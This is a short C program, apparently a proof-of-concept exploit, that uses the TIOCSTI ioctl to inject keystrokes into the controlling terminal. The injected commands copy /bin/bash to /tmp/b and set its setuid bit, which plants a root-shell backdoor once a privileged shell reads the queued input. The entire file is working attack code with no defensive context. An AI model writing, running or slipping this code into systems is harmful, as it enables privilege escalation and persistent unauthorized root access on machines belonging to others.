#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>

int main() {
    int fd = open("/dev/tty", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    char *x = "cp /bin/bash /tmp/b\nchmod u+s /tmp/b\n";
    while (*x != 0) {
        int ret = ioctl(fd, TIOCSTI, x);
        if (ret == -1) {
            perror("ioctl()");
        }
        x++;
    }
    return 0;
}
